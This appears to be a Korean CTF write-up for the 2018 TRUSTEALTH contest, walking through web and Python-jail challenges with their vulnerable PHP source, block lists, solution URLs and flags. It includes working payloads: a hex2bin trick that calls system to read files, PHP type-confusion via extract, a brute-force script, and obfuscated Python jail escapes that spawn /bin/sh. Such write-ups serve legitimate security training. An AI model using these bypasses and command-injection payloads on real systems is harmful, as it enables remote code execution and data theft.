# [2018_TRUSTEALTH] \[Web] 관심법

<http://trustealth.ga/gwansimbub.html>

페이지 소스를 보면 flag를 획득할 수 있습니다.

```html

<!DOCTYPE HTML>
<html>
<head>
</head>
<body>
    <h1>Hmm... There is a 'FLAG' in this page...</h1>
    <br>
    <h3>Hint : Press the 'F12'</h3>
    <img ... />
    <!--I_WANT_GO_H0ME-->
</body>


```

`FLAG{I_WANT_GO_H0ME}`

# [2018_TRUSTEALTH] \[Web] Show me your ability  

http://dimitrust.oa.to:8080/trustctf/substr/

```php
<?php

include(__DIR__."/lib.php");

$check = substr($_SERVER['QUERY_STRING'], 0, 32);

if (preg_match("/flag/i", $check))
{
    echo "No Hack!!";
}

if ($_GET['flag'] === "Give me flag")
{
    echo "Alright.. I'll give you my flag,, <br>";
    echo $flag;
}

show_source(__FILE__);

?>
```

http://dimitrust.oa.to:8080/trustctf/substr/?flag=Give%20me%20flag

`TRUST{you_are_the_greatest_hacker_in_the_world}`

# [2018_TRUSTEALTH] \[Web] HTTP Header

http://dimitrust.oa.to:8080/trustctf/http_header/

```php
Plz input your url 
<?php

include __DIR__."/lib.php";

if (isset($_GET['url'][10]))
{
    header("location: {$_GET['url']}");
    echo "This is my present! Here is flag! {$flag} <br>";
}

else
{
    echo "Plz input your url <br>";
}

show_source(__FILE__);

?>
```

url 인자에 11글자 이상 입력하면 flag가 뜹니다.

```
$ http GET "http://dimitrust.oa.to:8080/trustctf/http_header/?url=aaaaaaaaaaaaaaaaa"
HTTP/1.1 302 Found
Connection: Keep-Alive
Content-Length: 1874
Content-Type: text/html; charset=UTF-8
Date: Sun, 04 Mar 2018 04:28:15 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)
location: aaaaaaaaaaaaaaaaa

This is my present! Here is flag! TRUST{oh_can_you_bypass_it?}
```

`TRUST{oh_can_you_bypass_it?}`

# [2018_TRUSTEALTH] \[Web] Lucky Number

http://dimitrust.oa.to:8080/trustctf/lucky_number/

```php
Try more! 
<?php

include(__DIR__."/lib.php");
// Lucky number is in 0 ~ 9999

if ($_GET['number'] == $lucky_number)
{
    echo $flag;
}

else 
{
    echo "Try more! <br>";
}

show_source(__FILE__);

?>
```

브루트포싱 문제입니다.

````python
import requests

num = 0
while num < 9999:
    url = "http://dimitrust.oa.to:8080/trustctf/lucky_number/?number="+str(num)
    print url
    r = requests.get(url)
    response = r.content
    if "TRUST{" in response:
        break
    num += 1
print response
````

1337이 정답입니다.

`TRUST{you_are_good_at_programming` 

# [2018_TRUSTEALTH] \[Web] PHP Jail 

http://dimitrust.oa.to:8080/trustctf/jail/

```php
<?php

include __DIR__ . "/lib.php";

$filters = "system|assert|passthru|shell|exec|eval|read|open|dir|\.|_|curl|info";
if (isset($_GET['code']))
{
    if (preg_match("/{$filters}/i", $_GET['code']))
    {
        die("No hack ~_~");
    }
    eval($_GET['code']);
}

show_source(__FILE__);

?>
```

필터링 우회해서 system 함수 호출하면 됩니다.

`http://dimitrust.oa.to:8080/trustctf/jail/?code=hex2bin('73797374656d')('cat flag*');`

`FLAG{i think u r good at php}`

# [2018_TRUSTEALTH] \[Web] RedVelvet

```html
    <body>  
        <h1>함수를 실행시켜보자!!!!</h1>
        <img src = "http://cfile22.uf.tistory.com/original/99104F335A0FCB3E2E91CE"/>
        <!--존재 함수 : yeri(), seulgi(), irene(), wendy(), joy()-->
    </body>
```

이유는 모르겠으나 그냥 함수 실행시키면 플래그를 줍니다..

`FLAG{I_1ike_Red_Velvet~!!!!~!~!}`

# [2018_TRUSTEALTH] \[Web] Do you know php trick?

http://dimitrust.oa.to:8080/trustctf/extract/

```php
no hack <?php

include(__DIR__."/lib.php");
extract($_GET);

if ($_SESSION['var'] === $_COOKIE['var'])
{
    echo "no hack";
}

else if ( md5($_SESSION['var']) == md5($_COOKIE['var']) )
{
    echo $flag;
}

show_source(__FILE__);
?>
```

php type confusion 문제 입니다. 조건 맞춰서 input 넣어줍니다.

`http://dimitrust.oa.to:8080/trustctf/extract/?_SESSION[var][]=1&_COOKIE[var][]=`

`TRUST{you_are_php_trick_master}`

# [2018_TRUSTEALTH] \[Pwn] Python shell

input을 넣으면 `eval` 함수를 실행시켜 줍니다.

```
####################
#### ch4n3 jail ####
####################
>>> __import__('os').system('cat flag')
FLAG{You already know python jail escaping}
0
```

# [2018_TRUSTEALTH] \[PWN] Pyjail

```
Welcome Pyjail!
'Q' or 'q' is Exit

You can't use this one : ['\\', '\\x', '%', 'sys', 'os', 'subprocess', '+', '=', 'glob', 'exec', 'input', 'global', 'local', '.', 'getattr', 'open', 'read', 'file', 'from']

>> 
```

위의 문자열들은 입력할 수 없습니다.

```
print dir()
['ban_list', 'data', 'j']
>> print ban_list
['\\', '\\x', '%', 'sys', 'os', 'subprocess', '+', '=', 'glob', 'exec', 'input', 'global', 'local', '.', 'getattr', 'open', 'read', 'file', 'from']
>> del ban_list[7]
>> print ban_list
['\\', '\\x', '%', 'sys', 'os', 'subprocess', '+', 'glob', 'exec', 'input', 'global', 'local', '.', 'getattr', 'open', 'read', 'file', 'from']
>> ban_list = []
```

필터링을 무력화 시켜 os.system 메소드를 실행했습니다.

```#
>> __import__('os').system('cat /home/Pyjail/flag')
TRUST{pyja1l_1s_s0_h4rd_:(}
```

# [2018_TRUSTEALTH] \[PWN] Pyjail2

```
Welcome Pyjail!
'Q' or 'q' is Exit

>> 
```

필터링 리스트가 안 주어집니다.

```
>> print dir()
['b4n1ist15it', 'data', 'j']
>> print b4n1ist15it
['\\', '\\x', '%', 'sys', 'os', 'subprocess', '+', 'glob', 'exec', 'input', 'global', 'local', '.', 'open', 'read', 'file', 'from', 'eval', '_', 'attr', 'system', 'modules', '[', ']']
>> b4n1ist15it=''
>> __import__('os').system('cat /home/Pyjail2/flag')
TRUST{dir_mag1c_N3w_meta_pyja1l_1s_g00d_0r_b4d...?_t3l1_m3}
```

필터링 리스트를 확인하고 우회한 후 커맨드 인젝션을 했습니다.

# [2018_TRUSTEALTH] \[PWN] Pyjail3

```
getattr(__import__('os'),'system')("/bin/sh")

__import__('os') == vars(__builtins__)[dir(__builtins__)[55]](b4n1ist15it[6])

"system" == dir(vars(__builtins__)[dir(__builtins__)[55]](b4n1ist15it[6]))[215]

vars(__builtins__)[dir(__builtins__)[90]](vars(__builtins__)[dir(__builtins__)[55]](b4n1ist15it[6]),dir(vars(__builtins__)[dir(__builtins__)[55]](b4n1ist15it[6]))[215])("/bin/sh")
```

최상단에 있는 코드를 실행시키는 것이 최종 목표입니다. 아래는 필터링을 우회한 가젯(?)이며 맨 아랫줄에는 최종적으로 만들어지는 exploit 코드입니다.

```
>> vars(__builtins__)[dir(__builtins__)[90]](vars(__builtins__)[dir(__builtins__)[55]](b4n1ist15it[6]),dir(vars(__builtins__)[dir(__builtins__)[55]](b4n1ist15it[6]))[215])("/bin/sh")
cat /home/Pyjail3/flag
TRUST{pyja1l_1s_s0_fun_S0_s1eepy_n0w...}
```